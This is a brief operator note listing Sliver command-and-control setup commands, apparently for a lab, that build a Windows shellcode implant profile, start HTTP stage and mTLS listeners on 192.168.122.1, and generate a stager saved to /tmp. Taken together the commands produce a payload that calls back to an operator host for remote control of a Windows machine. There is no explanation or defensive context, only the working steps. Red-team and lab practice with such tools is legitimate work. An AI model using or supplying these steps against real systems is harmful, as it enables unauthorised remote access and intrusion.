Sliver-server setup: "https://sliver.sh/docs?name=Stagers"

* profiles new --mtls 192.168.122.1 --format shellcode win-implant
* stage-listener --url http://192.168.122.1:1234 --profile win-implant
* mtls -L 192.168.122.1 -l 8888
* generate stager --lhost 192.168.122.1 --lport 1234 --protocol http --save /tmp




